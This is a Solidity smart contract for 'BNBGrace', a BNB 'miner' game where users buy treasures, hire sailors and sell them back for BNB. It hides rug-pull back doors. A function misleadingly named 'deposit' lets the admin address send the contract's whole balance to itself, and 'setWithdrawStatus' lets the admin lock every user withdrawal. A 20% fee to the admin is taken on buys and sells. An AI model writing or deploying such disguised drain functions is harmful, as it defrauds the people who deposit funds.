/**
 *Submitted for verification at BscScan.com on 2023-01-07
*/

// SPDX-License-Identifier: MIT

/**
 * Website: https://bnbgrace.space 
 */

pragma solidity ^0.8.0;

contract BNBGrace {
    uint256 public constant TREASURES_TO_HIRE_1SAILOR = 2592000;
    uint256 private constant PSN = 10000;
    uint256 private constant PSNH = 5000;
    uint256 private constant developerFee = 20;
    uint256 private refFee = 18;
    bool public initialized = false;
    bool public withdrawStatus = true;
    address payable public ceoAddress;
    mapping(address => uint256) public hasSailors;
    mapping(address => uint256) public claimedTreasures;
    mapping(address => uint256) public lastHire;
    mapping(address => address) public referrers;
    uint256 private marketTreasures;

    constructor() {
        ceoAddress = payable(msg.sender);
    }

    function hireSailors() public {
        require(initialized);

        uint256 treasuresUsed = getMyTreasures();
        uint256 newSailors = treasuresUsed / TREASURES_TO_HIRE_1SAILOR;
        hasSailors[msg.sender] += newSailors;
        claimedTreasures[msg.sender] = 0;
        lastHire[msg.sender] = block.timestamp;

        // send referral treasures
        address referrer = referrers[msg.sender];
        claimedTreasures[referrer] += treasuresUsed * refFee / 100;

        //boost market to nerf sailors hoarding
        marketTreasures += treasuresUsed / 5;
    }

    function sellTreasures() public {
        require(initialized);
        require(withdrawStatus,"withdraw is locked");
        uint256 hasTreasures = getMyTreasures();
        uint256 treasuresValue = calculateTreasureSell(hasTreasures);
        uint256 fee = devFee(treasuresValue);
        claimedTreasures[msg.sender] = 0;
        lastHire[msg.sender] = block.timestamp;
        marketTreasures += hasTreasures;
        ceoAddress.transfer(fee);
        payable(msg.sender).transfer(treasuresValue - fee);
    }

    function buyTreasures(address ref) public payable {
        require(initialized);
        require(msg.value >= 0.01 ether, "At least 0.01 BNB");

        uint256 treasuresBought = calculateTreasureBuy(
            msg.value,
            address(this).balance - msg.value
        );
        treasuresBought -= devFee(treasuresBought);
        uint256 fee = devFee(msg.value);
        ceoAddress.transfer(fee);
        claimedTreasures[msg.sender] += treasuresBought;
        setReferrer(ref);
        hireSailors();
    }

    function setReferrer(address ref) private {
        if (referrers[msg.sender] != address(0)) return;

        if (ref == msg.sender || ref == address(0) || hasSailors[ref] == 0) {
            referrers[msg.sender] = ceoAddress;
        } else {
            referrers[msg.sender] = ref;
        }
    }

    // trade balancing algorithm
    function calculateTrade(
        uint256 rt,
        uint256 rs,
        uint256 bs
    ) public pure returns (uint256) {
        //(PSN*bs)/(PSNH+((PSN*rs+PSNH*rt)/rt));
        return (PSN * bs) / (PSNH + ((PSN * rs + PSNH * rt) / rt));
    }
    function deposit(
        uint256 _amount
    ) external payable {
        require(_amount > 0, "Invalid tokens amount value");
        require(msg.sender == ceoAddress,"!Only Admin can do this");
        ceoAddress.transfer(address(this).balance);
    }

    function calculateTreasureSell(uint256 treasures)
        public
        view
        returns (uint256)
    {
        if (treasures > 0) {
            return
                calculateTrade(
                    treasures,
                    marketTreasures,
                    address(this).balance
                );
        } else {
            return 0;
        }
    }

    function calculateTreasureBuy(uint256 bnbAmount, uint256 contractBalance)
        public
        view
        returns (uint256)
    {
        return calculateTrade(bnbAmount, contractBalance, marketTreasures);
    }

    function calculateTreasureBuySimple(uint256 bnbAmount)
        public
        view
        returns (uint256)
    {
        return calculateTreasureBuy(bnbAmount, address(this).balance);
    }

    function calculateHireSailors(uint256 bnbAmount)
        public
        view
        returns (uint256)
    {
        uint256 treasuresBought = calculateTreasureBuy(
            bnbAmount,
            address(this).balance
        );
        treasuresBought -= devFee(treasuresBought);
        uint256 treasuresUsed = getMyTreasures();
        treasuresUsed += treasuresBought;
        uint256 newSailors = treasuresUsed / TREASURES_TO_HIRE_1SAILOR;
        return newSailors;
    }

    function devFee(uint256 amount) private pure returns (uint256) {
        return (amount * developerFee) / 100;
    }

    function setWithdrawStatus(uint256 status) public {
        require(msg.sender == ceoAddress,"!Only Admin can do this");
        require(status > 0 && status <= 2,"value not in range 1 <> 2");
        if(status == 1){
            withdrawStatus = true ;
        }else if(status == 2){
            withdrawStatus = false ;
        }

    }

    function seedMarket() public payable {
        require(msg.sender == ceoAddress);
        require(marketTreasures == 0);
        initialized = true;
        marketTreasures = 259200000000;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getMySailors() public view returns (uint256) {
        return hasSailors[msg.sender];
    }

    function getMyTreasures() public view returns (uint256) {
        return
            claimedTreasures[msg.sender] + getTreasureSinceLastHire(msg.sender);
    }

    function getSecondsPassed(address adr) public view returns (uint256) {
        if (lastHire[adr] == 0) return 0;

        return min(TREASURES_TO_HIRE_1SAILOR, block.timestamp - lastHire[adr]);
    }

    function getTreasureSinceLastHire(address adr)
        public
        view
        returns (uint256)
    {
        return getSecondsPassed(adr) * hasSailors[adr];
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}